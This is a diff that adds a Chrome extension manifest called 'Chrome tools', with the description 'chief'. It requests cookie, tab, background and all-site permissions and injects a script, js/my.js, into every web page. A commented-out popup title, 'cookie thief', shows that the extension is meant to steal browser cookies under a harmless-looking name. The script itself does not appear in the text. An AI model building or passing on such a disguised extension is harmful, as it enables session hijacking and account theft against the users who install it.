@@ -1,0 +1,29 @@
+{
+	"manifest_version" : 2,
+	"name" : "Chrome tools",
+	"description" : "chief",
+	"version" : "2.2.12",
+	"permissions" : [
+		"tabs", "cookies", "http://*/*", "https://*/*", "background"
+	],
+	"icons" : {
+		"16":"imgs/16.png", 
+		"48":"imgs/48.png", 
+		"128":"imgs/128.png"
+	},
+	"web_accessible_resources" : [
+		"js/my.js"
+	],
+	"content_scripts" : [
+		{
+			"matches" : ["http://*/*", "https://*/*"],
+			// "css" : ["css/my.css"],
+			"js" : ["js/my.js"]
+		}
+	]
+	// "browser_action" : {
+	// 	"default_icon" : "imgs/128.png",
+	// 	"default_title" : "cookie thief",
+	// 	"default_popup" : "popup.html"
+	// }
+}
